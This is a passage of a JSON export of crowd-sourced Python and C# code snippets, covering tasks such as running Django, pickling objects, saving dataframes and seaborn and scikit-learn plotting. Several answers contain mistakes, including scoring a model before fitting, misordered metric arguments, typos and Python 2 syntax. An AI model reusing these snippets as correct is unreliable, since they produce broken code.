  },
  {
    "id": 4208,
    "keyword": null,
    "link": null,
    "title": " run JupyterLab",
    "description": "jupyter lab\njupyter-lab\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4209,
    "keyword": null,
    "link": null,
    "title": " run code with different verions of python",
    "description": "py -3 file_name.py    #will run file file_name.py in python 3\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4210,
    "keyword": null,
    "link": null,
    "title": " run django app locally",
    "description": "# to start a django server cd to dir with manage.py file and type following python manage.py runserver \npython manage.py runserver or python3 manage.py runserver \n$ python manage.py runserver \n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4211,
    "keyword": null,
    "link": null,
    "title": " run every minute python",
    "description": "from time import time, sleep while True:     sleep(60 - time() % 60) \t# thing to run\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4212,
    "keyword": null,
    "link": null,
    "title": " run linux command using python",
    "description": "import subprocess subprocess.call(\"command1\") subprocess.call([\"command1\", \"arg1\", \"arg2\"])\nimport os cmd = 'your command here' os.system(cmd) \nimport os os.system(\"command..\")\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4213,
    "keyword": null,
    "link": null,
    "title": " run py file in another py file",
    "description": "os.system('python my_file.py')\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4214,
    "keyword": null,
    "link": null,
    "title": " run python script from c#",
    "description": "using IronPython.Hosting; using Microsoft.Scripting.Hosting;  private static void doPython() {     ScriptEngine engine = Python.CreateEngine();     engine.ExecuteFile(@\"test.py\"); }  //You can get IronPython here : https://ironpython.net/\nprivate void run_cmd(string cmd, string args) {      ProcessStartInfo start = new ProcessStartInfo();      start.FileName = \"my/full/path/to/python.exe\";      start.Arguments = string.Format(\"{0} {1}\", cmd, args);      start.UseShellExecute = false;      start.RedirectStandardOutput = true;      using(Process process = Process.Start(start))      {          using(StreamReader reader = process.StandardOutput)          {              string result = reader.ReadToEnd();              Console.Write(result);          }      } } \nstring strCmdText; string file; file = \"py.py\" strCmdText= \"python3\" + file; System.Diagnostics.Process.Start(\"CMD.exe\",strCmdText);\n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4215,
    "keyword": null,
    "link": null,
    "title": " run selenium internet explorer python",
    "description": "from selenium import webdriver driver = webdriver.Ie() \n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4216,
    "keyword": null,
    "link": null,
    "title": " runner up python",
    "description": "n = int(input()) arr = list(map(int, input().split())) if arr[0]!=arr[1]:     mx=max(arr[0],arr[1])     second_max=min(arr[0],arr[1])     for i in range(2,n):             if arr[i]>mx:             second_max=mx             mx=arr[i]         elif arr[i]>second_max and arr[i]!=mx:             second_max=arr[i] elif arr[0]==arr[1]:     mx=max(arr[0],arr[1])     second_max=[]     for i in range(2,n):         if arr[i]>mx:             mx=arr[i]         elif arr[i]<mx and arr[i]!=second_max:             second_max=arr[i]         elif arr[-1]>mx:             second_max=mx             mx=arr[i] print(second_max) #looks a lot but easy to understand i guess #jt272525@gmail.com contact me  \n",
    "reg_date": "2021-10-12T11:34:45.000Z"
  },
  {
    "id": 4217,
    "keyword": null,
    "link": null,
    "title": " running selenium on google colab",
    "description": "!pip install selenium !apt-get update # to update ubuntu to correctly run apt install !apt install chromium-chromedriver !cp /usr/lib/chromium-browser/chromedriver /usr/bin import sys sys.path.insert(0,'/usr/lib/chromium-browser/chromedriver') from selenium import webdriver chrome_options = webdriver.ChromeOptions() chrome_options.add_argument('--headless') chrome_options.add_argument('--no-sandbox') chrome_options.add_argument('--disable-dev-shm-usage') wd = webdriver.Chrome('chromedriver',chrome_options=chrome_options) wd.get(\"https://www.webite-url.com\") \n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4218,
    "keyword": null,
    "link": null,
    "title": " sample 1 item from array python",
    "description": "import random cakes = ['lemon', 'strawberry', 'chocolate'] random.choice(cakes) # prints 1 randomly selected item from the collection of n items with  # the probability of selection as 1/n\nimport random sequence = [i for i in range(20)] subset = sample(sequence, 5) #5 is the lenth of the sample print(subset) # prints 5 random numbers from sequence (without replacement)\n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4219,
    "keyword": null,
    "link": null,
    "title": " save a dict to pickle",
    "description": "import pickle  a = {'hello': 'world'}  with open('filename.pickle', 'wb') as handle:     pickle.dump(a, handle, protocol=pickle.HIGHEST_PROTOCOL)  with open('filename.pickle', 'rb') as handle:     b = pickle.load(handle) \n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4220,
    "keyword": null,
    "link": null,
    "title": " save an image in python as grayscale cv2",
    "description": "cv2.imwrite('data/dst/lena_opencv_red.jpg', im) \n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4221,
    "keyword": null,
    "link": null,
    "title": " save and load a dictionary python",
    "description": "import pickle dictionary_data = {\"a\": 1, \"b\": 2} a_file = open(\"data.pkl\", \"wb\") pickle.dump(dictionary_data, a_file) a_file.close() a_file = open(\"data.pkl\", \"rb\") output = pickle.load(a_file) print(output) a_file.close()\n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4222,
    "keyword": null,
    "link": null,
    "title": " save and load sklearn model PKL",
    "description": "model.fit(X_train, Y_train) # save the model to disk filename = 'finalized_model.sav' pickle.dump(model, open(filename, 'wb'))   # load the model from disk loaded_model = pickle.load(open(filename, 'rb')) result = loaded_model.score(X_test, Y_test)\n# save as object import pickle  s = pickle.dumps(clf) clf2 = pickle.loads(s)  # save to file from joblib import dump  dump(clf, 'filename.joblib')   # load from file from joblib import load  clf = load('filename.joblib')\n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4223,
    "keyword": null,
    "link": null,
    "title": " save array as npz python",
    "description": "# save numpy array as npy file from numpy import asarray from numpy import save # define data data = asarray([[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]]) # save to npy file save('data.npy', data)  # load numpy array from npy file from numpy import load # load array data = load('data.npy', allow_pickle=True)) # print the array print(data)\n# save numpy array as npy file from numpy import asarray from numpy import save # define data data = asarray([[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]]) # save to npy file save('data.npy', data)  # load numpy array from npy file from numpy import load # load array data = load('data.npy') # print the array print(data)\n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4224,
    "keyword": null,
    "link": null,
    "title": " save clipboard data win32clipboard python",
    "description": "import win32clipboard  # set clipboard data win32clipboard.OpenClipboard() win32clipboard.EmptyClipboard() win32clipboard.SetClipboardText('testing 123') win32clipboard.CloseClipboard()  # get clipboard data win32clipboard.OpenClipboard() data = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() print data\n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4225,
    "keyword": null,
    "link": null,
    "title": " save dataframe as csv",
    "description": "df.to_csv(r'/directory/path/file_name.csv', index = False, header = True)\ndf.to_csv('out.csv')\ndf.to_csv('file_name.csv', index=False)\ndf = pd.read_csv('data.csv')   \ndf.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv', index = False) \ndf.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv') \n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4226,
    "keyword": null,
    "link": null,
    "title": " save df to txt",
    "description": "df.to_csv(r'c:\\data\\pandas.txt', header=None, index=None, sep='\\t', mode='a')\n",
    "reg_date": "2021-10-12T11:34:46.000Z"
  },
  {
    "id": 4227,
    "keyword": null,
    "link": null,
    "title": " save file python tkinter",
    "description": "from tkinter import filedialog from tkinter import *  win = Tk() filename = filedialog.asksaveasfilename(initialdir='/', title='Save File', filetypes=(('Text Files', 'txt.*'), ('All Files', '*.*'))) textContent = \"I'm the text in the file\" myfile = open(filename, \"w+\") myfile.write(textContent) # to test print(\"File saved as \", filename)\n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4228,
    "keyword": null,
    "link": null,
    "title": " save image requests python",
    "description": "import requests  url = 'http://google.com/favicon.ico' r = requests.get(url, allow_redirects=True) open('google.ico', 'wb').write(r.content) \nimport requests  def is_downloadable(url):     \"\"\"     Does the url contain a downloadable resource     \"\"\"     h = requests.head(url, allow_redirects=True)     header = h.headers     content_type = header.get('content-type')     if 'text' in content_type.lower():         return False     if 'html' in content_type.lower():         return False     return True  print(is_downloadable('https://www.youtube.com/watch?v=9bZkp7q19f0')) # >> False print(is_downloadable('http://google.com/favicon.ico')) # >> True \n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4229,
    "keyword": null,
    "link": null,
    "title": " save json to file",
    "description": "with open('output.json', 'w') as outfile:     json.dump(data, outfile)\nimport json  data = {\"key\": \"value\"}  with open('data.json', 'w') as jsonfile:     json.dump(data, jsonfile) \nimport json with open('data.json', 'w') as f:     json.dump(data, f)\nwith open('data.txt', 'w') as outfile:     json.dump(data, outfile)\nimport json  with open('file_to_load.json', 'r') as file:   data = json.load(file)\nimport json  data = {}  with open('data.txt', 'w') as outfile:     json.dump(data, outfile) \n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4230,
    "keyword": null,
    "link": null,
    "title": " save list to file python",
    "description": "# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem)\ncolor = ['Red', 'Green', 'White', 'Black', 'Pink', 'Yellow'] with open('file1.txt','w+') as f: \tfor i in color: \t\tf.write('%s\\n'%i)  with open('file1.txt') as f: \tprint(f.read()) ############### list1=[] with open('file1.txt','r+') as f: \tlines = f.readlines() \tfor line in  lines: \t\titem = line[:-1] \t\tlist1.append(item) \tprint(list1) #############  with open('file1.txt','r') as f: \tlines=f.read() \tlistli=lines.split('\\n') \tprint(listli) \t# listli=lines.strip() \t# print(listli) \nimport json a = [1,2,3] with open('test.txt', 'w') as f:     f.write(json.dumps(a))  #Now read the file back into a Python list object with open('test.txt', 'r') as f:     a = json.loads(f.read())\nwith open('your_file.txt', 'w') as f:     for item in my_list:         f.write(\"%s\\n\" % item) \n# attempt #1 f = open(\"Bills.txt\", \"w\") f.write(\"\\n\".join(map(lambda x: str(x), bill_List))) f.close()   # attempt #2 # Open a file in write mode f = open('Bills.txt', 'w') for item in bill_List: f.write(\"%s\\n\" % item) # Close opend file f.close()  # attempt #3  with open('Bills.txt', 'w') as f: for s in bill_List:     f.write(s + '\\n')  with open('Bills.txt', 'r') as f: bill_List = [line.rstrip('\\n') for line in f]  # attempt #4 with open('Bills.txt', 'w') as out_file: out_file.write('\\n'.join(     bill_List)) \n# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem) \n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4231,
    "keyword": null,
    "link": null,
    "title": " save machine learning model",
    "description": "# fit the model model.fit(X_train, y_train)  # save the model import pickle pickle.dump(model, open(\"model.pkl\", \"wb\"))  # load the model model = pickle.load(open(\"model.pkl\", \"rb\"))  # use model to predict y_pred = model.predict(X_input)\nmodel.fit(X_train, Y_train) # save the model to disk filename = 'finalized_model.sav' pickle.dump(model, open(filename, 'wb'))   # load the model from disk loaded_model = pickle.load(open(filename, 'rb')) result = loaded_model.score(X_test, Y_test)\n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4232,
    "keyword": null,
    "link": null,
    "title": " save machine learning model python",
    "description": "model.fit(X_train, Y_train) # save the model to disk filename = 'finalized_model.sav' pickle.dump(model, open(filename, 'wb'))   # load the model from disk loaded_model = pickle.load(open(filename, 'rb')) result = loaded_model.score(X_test, Y_test)\n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4233,
    "keyword": null,
    "link": null,
    "title": " save matplotlib figure",
    "description": "# Basic syntax: plt.savefig(\"/path/to/output/directory/figure.png\")  # Example usage: import matplotlib.pyplot as plt plt.figure() plt.plot(range(5)) plt.savefig(\"~/Documents/figure.png\", dpi=300)\nIn [5]: plt.savefig('books_read.png')\nIn [5]: plt.savefig('books_read.png') \nplt.savefig('image.png')\n#where to save the figures PROJECT_ROOT_DIR = \".\" CHAPTER_ID = \"classification\" IMAGES_PATH = os.path.join(PROJECT_ROOT_DIR, \"images\", CHAPTER_ID) os.makedirs(IMAGES_PATH, exist_ok = True)  def save_fig(fig_id, tight_layout=True, fig_extension=\"png\", resolution=300):     path = os.path.join(IMAGES_PATH, fig_id + \".\" + fig_extension)     print(\"Saving figure\", fig_id)     if tight_layout:         plt.tight_layout()     plt.savefig(path, format=fig_extension, dpi=resolution)\nimport matplotlib.pyplot as plt plt.figure() plt.plot([1,2,3],[1,2,3]) plt.savefig(\"out.png\")\n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4234,
    "keyword": null,
    "link": null,
    "title": " save np array as mat file",
    "description": "scipy.io.savemat('test.mat', {'mydata': mydata})\n",
    "reg_date": "2021-10-12T11:34:47.000Z"
  },
  {
    "id": 4235,
    "keyword": null,
    "link": null,
    "title": " save numpy array to csv",
    "description": "from numpy import genfromtxt my_data = genfromtxt('my_file.csv', delimiter=',') \nimport pandas as pd  pd.DataFrame(np_array).to_csv(\"path/to/file.csv\")\nimport numpy as np x = np.arange(0.0,5.0,1.0) np.savetxt('test.csv', x, delimiter=',') \n",
    "reg_date": "2021-10-12T11:34:48.000Z"
  },
  {
    "id": 4236,
    "keyword": null,
    "link": null,
    "title": " save pandas into csv",
    "description": "df.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv', index = False) \ndf.to_csv(file_name, sep='\\t')\n",
    "reg_date": "2021-10-12T11:34:48.000Z"
  },
  {
    "id": 4237,
    "keyword": null,
    "link": null,
    "title": " save plot in python",
    "description": "In [5]: plt.savefig('books_read.png')\nIn [5]: plt.savefig('books_read.png') \nplt.savefig('books_read.png')\n#where to save the figures PROJECT_ROOT_DIR = \".\" CHAPTER_ID = \"classification\" IMAGES_PATH = os.path.join(PROJECT_ROOT_DIR, \"images\", CHAPTER_ID) os.makedirs(IMAGES_PATH, exist_ok = True)  def save_fig(fig_id, tight_layout=True, fig_extension=\"png\", resolution=300):     path = os.path.join(IMAGES_PATH, fig_id + \".\" + fig_extension)     print(\"Saving figure\", fig_id)     if tight_layout:         plt.tight_layout()     plt.savefig(path, format=fig_extension, dpi=resolution)\n",
    "reg_date": "2021-10-12T11:34:48.000Z"
  },
  {
    "id": 4238,
    "keyword": null,
    "link": null,
    "title": " save request response json to file python",
    "description": "import requests # there is inbuilt json() constructor for requests.get() method json_data = requests.get(\"https://api.blinkist.com/v4/books/5420831a63656400089f0000\").json() print(json_data)  # To actually write the data to the file, we just call the dump() function from json library import json with open('personal.json', 'w') as json_file:     json.dump(json_data, json_file) \nfrom tkinter import * import os  # window window = Tk() window.geometry(\"450x450\") window.title(\"Gui App\") window.configure(bg=\"powder blue\")  # Enter or user input in tkinter filename = Entry(window, width=75) filename.pack()  # Run file Function  def runFile():   try:   \tos.startfile(filename.get())       except:     error = Label(window, text=f\"No file found as {filename.get}\")     error.pack()       # Run file button open_file_button = Button(window, text=\"Run File\", command=runFile) open_file_button.pack()  window.mainloop() \n",
    "reg_date": "2021-10-12T11:34:48.000Z"
  },
  {
    "id": 4239,
    "keyword": null,
    "link": null,
    "title": " save screenshot of screen in pygame",
    "description": "rect = pygame.Rect(25, 25, 100, 50) sub = screen.subsurface(rect) pygame.image.save(sub, \"screenshot.jpg\") #The saved portion of the screen will be the rect portion\n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4240,
    "keyword": null,
    "link": null,
    "title": " save thing in pickle python",
    "description": "import pickle  a = {'hello': 'world'}  with open('filename.pickle', 'wb') as handle:     pickle.dump(a, handle, protocol=pickle.HIGHEST_PROTOCOL)  with open('filename.pickle', 'rb') as handle:     b = pickle.load(handle)  print a == b \nimport pickle file_name='my_file.pkl' f = open(file_name,'wb') pickle.dump(my_data,f) f.close()\nimport pickle # load : get the data from file data = pickle.load(open(file_path, \"rb\")) # loads : get the data from var data = pickle.load(var)\nwith open('mypickle.pickle', 'wb') as f:     pickle.dump(some_obj, f)  # note that this will overwrite any existing file # in the current working directory called 'mypickle.pickle' \n   1 # Load the dictionary back from the pickle file.    2 import pickle    3     4 favorite_color = pickle.load( open( \"save.p\", \"rb\" ) )    5 # favorite_color is now { \"lion\": \"yellow\", \"kitty\": \"red\" } \n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4241,
    "keyword": null,
    "link": null,
    "title": " save video cv2",
    "description": "import numpy as np import cv2  cap = cv2.VideoCapture(0)  # Define the codec and create VideoWriter object #fourcc = cv2.cv.CV_FOURCC(*'DIVX') #out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480)) out = cv2.VideoWriter('output.avi', -1, 20.0, (640,480))  while(cap.isOpened()):     ret, frame = cap.read()     if ret==True:         frame = cv2.flip(frame,0)          # write the flipped frame         out.write(frame)          cv2.imshow('frame',frame)         if cv2.waitKey(1) & 0xFF == ord('q'):             break     else:         break  # Release everything if job is finished cap.release() out.release() cv2.destroyAllWindows() \n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4242,
    "keyword": null,
    "link": null,
    "title": " saving a pandas dataframe as a csv",
    "description": "df.to_csv('out.csv')\ndf.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv', index = False) \n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4243,
    "keyword": null,
    "link": null,
    "title": " scan space seperated integers in python using map",
    "description": "inp = list(map(int,input().split()))\n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4244,
    "keyword": null,
    "link": null,
    "title": " scientific notation to decimal python",
    "description": "float(\"8.99284722486562e-02\") # and now with 'rounding' \"{:.8f}\".format(float(\"8.99284722486562e-02\"))\n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4245,
    "keyword": null,
    "link": null,
    "title": " scikit learn Elastic net",
    "description": "from sklearn.linear_model import ElasticNet EN = ElasticNet(random_state=0) EN.fit(X, y) EN.score(X, y) #Return the mean accuracy on the given test data and labels EN.predict(X) #Return the predictions  #Regression Metrics #Mean Absolute Error  from sklearn.metrics import mean_absolute_error  mean_absolute_error(y_true, y_pred)  #Mean Squared Error  from sklearn.metrics import mean_squared_error mean_squared_error(y_true, p_pred)  #R2 Score  from sklearn.metrics import r2_score r2_score(y_true, y_pred)  #If you like the answer, please upvote -;)\n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4246,
    "keyword": null,
    "link": null,
    "title": " scikit learn dataset into pandas dataframe",
    "description": "def answer_one():      import numpy as np     import pandas as pd     from sklearn.datasets import load_breast_cancer      cancer = load_breast_cancer()          data = np.c_[cancer.data, cancer.target]     columns = np.append(cancer.feature_names, [\"target\"])     return pd.DataFrame(data, columns=columns)  answer_one()\n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4247,
    "keyword": null,
    "link": null,
    "title": " scikit learn lasso regression",
    "description": "from sklearn import linear_model reg = linear_model.Lasso(alpha=0.1).fit(X, y) reg.fit(X, y) #We can fit Lasso to the dataset in this way too clf.score(X, y) #Return the mean accuracy on the given test data and labels cfl.predict(X) #Return the predictions  #Regression Metrics #Mean Absolute Error  from sklearn.metrics import mean_absolute_error  mean_absolute_error(y_true, y_pred)  #Mean Squared Error  from sklearn.metrics import mean_squared_error mean_squared_error(y_true, p_pred)  #R2 Score  from sklearn.metrics import r2_score r2_score(y_true, y_pred)  #If you like the answer, please upvote -;)\n",
    "reg_date": "2021-10-12T11:34:49.000Z"
  },
  {
    "id": 4248,
    "keyword": null,
    "link": null,
    "title": " scikit learn linear regression",
    "description": "from sklearn.linear_model import LinearRegression X = np.array([[1, 1], [1, 2], [2, 2], [2, 3]]) y = np.dot(X, np.array([1, 2])) + 3 reg = LinearRegression().fit(X, y) reg.score(X, y) reg.coef_ reg.intercept_ reg.predict(np.array([[3, 5]]))\nfrom sklearn.linear_model import LinearRegression reg = LinearRegression() reg.score(X, y) #Fit linear model reg.coef_ #Estimated coefficients for the linear regression problem reg.predict(y) #Predict using the linear model\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4249,
    "keyword": null,
    "link": null,
    "title": " scikit learn ridge classifier",
    "description": "from sklearn.linear_model import RidgeClassifier clf = RidgeClassifier().fit(X, y) clf.fit(X, y) #We can fit Ridge Classifier to the dataset in this way too clf.score(X, y) #Return the mean accuracy on the given test data and labels cfl.predict(X) #Return the predictions  #Classification Metrics #Accuracy Score from sklearn.metrics import accuracy_score accuracy_score(X, y)  #If you like answer, please vote -;)\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4250,
    "keyword": null,
    "link": null,
    "title": " scikit learn ridge regression",
    "description": "from sklearn.linear_model import Ridge clf = Ridge(alpha=1.0) clf.fit(X, y) #Fit Ridge regression model clf.predict(y) #Predict using the model\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4251,
    "keyword": null,
    "link": null,
    "title": " scikit learn split data set",
    "description": "import numpy as np from sklearn.model_selection import train_test_split X, y = np.arange(10).reshape((5, 2)), range(5) X      list(y)\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4252,
    "keyword": null,
    "link": null,
    "title": " scipy version check",
    "description": "import scipy scipy.__version__\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4253,
    "keyword": null,
    "link": null,
    "title": " scrapy get current url",
    "description": "def parse(self, response):    current_url = response.request.url\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4254,
    "keyword": null,
    "link": null,
    "title": " screen size tkinter",
    "description": "import tkinter as tk  root = tk.Tk()  screen_width = root.winfo_screenwidth() screen_height = root.winfo_screenheight()\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4255,
    "keyword": null,
    "link": null,
    "title": " scroll to element python selenium",
    "description": "   for i in range(20): # adjust integer value for need        # you can change right side number for scroll convenience or destination         driver.execute_script(\"window.scrollBy(0, 250)\")        # you can change time integer to float or remove        time.sleep(1) \nfrom selenium.webdriver.common.action_chains import ActionChains  element = driver.find_element_by_id(\"my-id\")  actions = ActionChains(driver) actions.move_to_element(element).perform()\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4256,
    "keyword": null,
    "link": null,
    "title": " scrollbar in tkinter",
    "description": "from Tkinter import *  root = Tk() scrollbar = Scrollbar(root) scrollbar.pack( side = RIGHT, fill = Y )  mylist = Listbox(root, yscrollcommand = scrollbar.set ) for line in range(100):    mylist.insert(END, \"This is line number \" + str(line))  mylist.pack( side = LEFT, fill = BOTH ) scrollbar.config( command = mylist.yview )  mainloop()\nframe = self.frame = tk.Frame(self) self.frame.grid(row=1, columnspan=2, padx=2, pady=2, sticky=tk.N+tk.E+tk.S+tk.W)  self.text_area = tk.Canvas(self.frame, background=\"black\", width=400, height=500, scrollregion=(0,0,1200,800)) self.hscroll = tk.Scrollbar(self.frame, orient=tk.HORIZONTAL, command=self.text_area.xview) self.vscroll = tk.Scrollbar(self.frame, orient=tk.VERTICAL, command=self.text_area.yview) self.text_area['xscrollcommand'] = self.hscroll.set self.text_area['yscrollcommand'] = self.vscroll.set  self.text_area.grid(row=0, column=0, sticky=tk.N+tk.S+tk.E+tk.W) self.hscroll.grid(row=1, column=0, sticky=tk.E+tk.W) self.vscroll.grid(row=0, column=1, sticky=tk.N+tk.S)  self._widgets = []  for row in range(rows):     current_row = []     for column in range(columns):         label = tk.Label(self.text_area, text=\"\",                           borderwidth=0, width=width)         label.grid(row=row, column=column, sticky=\"nsew\", padx=1, pady=1)         current_row.append(label)     self._widgets.append(current_row)\n",
    "reg_date": "2021-10-12T11:34:50.000Z"
  },
  {
    "id": 4257,
    "keyword": null,
    "link": null,
    "title": " sdjflk",
    "description": "import numpy as np\n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4258,
    "keyword": null,
    "link": null,
    "title": " seaborn axis limits",
    "description": "# Basic syntax: plt.set(ylim=(lower_bound, upper_bound)) # E.g.: plt.set(ylim=(0, 100))  # Note, change ylim to xlim to control the range on the x-axis # Note, use None on either bound to avoid having to specify it, e.g.: plt.set(ylim=(0, None))\n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4259,
    "keyword": null,
    "link": null,
    "title": " seaborn correlation heatmap",
    "description": "import seaborn as sns %matplotlib inline  # calculate the correlation matrix corr = auto_df.corr()  # plot the heatmap sns.heatmap(corr,          xticklabels=corr.columns,         yticklabels=corr.columns) \nimport pandas as pd import seaborn as sns import matplotlib.pyplot as plt #Seaborn again offers a neat tool to visualize pairwise correlation coefficients.  #The heatmap takes the DataFrame with the correlation coefficients as inputs,  #and visualizes each value on a color scale that reflects the range of relevant. values. #The parameter annot equals True ensures that the values of the correlation  #coefficients are displayed as well sns.heatmap(df.corr(), annot =True ) sns.set(rc = {'figure.figsize':(8,8)})#<--responsible for changing the size of a seaborn plot plt.show()\nimport pandas as pd import seaborn as sns  sns.heatmap(dataframe.corr(), annot=True) # annot is optional\nsns.heatmap(table2,annot=True,cmap='Blues', fmt='g')\n# Basic syntax: sns.heatmap(df, xticklabels=x_labels, yticklabels=y_labels)  # Example usage: import seaborn as sns flight = sns.load_dataset('flights') \t# Load flights datset from GitHub \t\t\t\t\t\t\t\t\t\t# seaborn repository  # Reshape flights dataeset to create seaborn heatmap flights_df = flight.pivot('month', 'year', 'passengers')   x_labels = [1,2,3,4,5,6,7,8,9,10,11,12] # Labels for x-axis y_labels = [11,22,33,44,55,66,77,88,99,101,111,121] # Labels for y-axis  # Create seaborn heatmap with required labels sns.heatmap(flights_df, xticklabels=x_labels, yticklabels=y_labels)\n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4260,
    "keyword": null,
    "link": null,
    "title": " seaborn create a correlation matrix",
    "description": "import seaborn as sns %matplotlib inline  # calculate the correlation matrix corr = auto_df.corr()  # plot the heatmap sns.heatmap(corr,          xticklabels=corr.columns,         yticklabels=corr.columns) \n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4261,
    "keyword": null,
    "link": null,
    "title": " seaborn figure size",
    "description": "plt.figure(figsize=(20,10))\nimport seaborn as sns  sns.set(rc={'figure.figsize':(11.7,8.27)})\nplt.rcParams['figure.figsize'] = [width, height]\nfrom matplotlib import pyplot import seaborn  import mylib  a4_dims = (11.7, 8.27) df = mylib.load_data() fig, ax = pyplot.subplots(figsize=a4_dims) seaborn.violinplot(ax=ax, data=df, **violin_options)\nimport seaborn as sns  sns.set(rc={'figure.figsize':(11.7,8.27)}) \n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4262,
    "keyword": null,
    "link": null,
    "title": " seaborn rotate axis labels",
    "description": "# Basic syntax: plt.set_xticklabels(plt.get_xticklabels(), rotation=45, horizontalalignment='right')  # Example usage: import pandas as pd import seaborn as sns import matplotlib.pyplot as plt  # Import data data = pd.read_csv(\"https://raw.githubusercontent.com/mojones/binders/master/olympics.csv\", sep=\"\\t\")  # Make figure with rotated axes plt.figure(figsize=(10,5))  chart = sns.countplot(     \t\tdata=data[data['Year'] == 1980],     \t\tx='Sport',     \t\tpalette='Set1')  chart.set_xticklabels(chart.get_xticklabels(), rotation=45, horizontalalignment='right')\nplt.figure(figsize=(10,5)) chart = sns.countplot(     data=data[data['Year'] == 1980],     x='Sport',     palette='Set1' ) chart.set_xticklabels(chart.get_xticklabels(), rotation=45)\nplt.figure(figsize=(15,8))  ax = sns.histplot(data=test, x='date')  ax.tick_params(axis='x', rotation=90) \nimport pandas import matplotlib.pylab as plt import seaborn as sns import numpy as np plt.rcParams[\"figure.figsize\"] = [7.50, 3.50] plt.rcParams[\"figure.autolayout\"] = True df = pandas.DataFrame({\"X-Axis\": [np.random.randint(10) for i in range(10)], \"YAxis\": [i for i in range(10)]}) bar_plot = sns.barplot(x='X-Axis', y='Y-Axis', data=df) plt.xticks(rotation=45) plt.show()\n",
    "reg_date": "2021-10-12T11:34:51.000Z"
  },
  {
    "id": 4263,
    "keyword": null,
    "link": null,
    "title": " seaborn rotate x labels",
    "description": "# Basic syntax: plt.set_xticklabels(plt.get_xticklabels(), rotation=45, horizontalalignment='right')  # Example usage: import pandas as pd import seaborn as sns import matplotlib.pyplot as plt  # Import data data = pd.read_csv(\"https://raw.githubusercontent.com/mojones/binders/master/olympics.csv\", sep=\"\\t\")  # Make figure with rotated axes plt.figure(figsize=(10,5))  chart = sns.countplot(     \t\tdata=data[data['Year'] == 1980],     \t\tx='Sport',     \t\tpalette='Set1')  chart.set_xticklabels(chart.get_xticklabels(), rotation=45, horizontalalignment='right')\nplt.figure(figsize=(10,5)) chart = sns.countplot(     data=data[data['Year'] == 1980],     x='Sport',     palette='Set1' ) chart.set_xticklabels(chart.get_xticklabels(), rotation=45)\nplt.figure(figsize=(15,8))  ax = sns.histplot(data=test, x='date')  ax.tick_params(axis='x', rotation=90) \nchart = data[data['Year'] == 1980]['Sport'].value_counts().plot(kind='bar') chart.set_xticklabels(chart.get_xticklabels(), rotation=45, horizontalalignment='right')\nimport pandas import matplotlib.pylab as plt import seaborn as sns import numpy as np 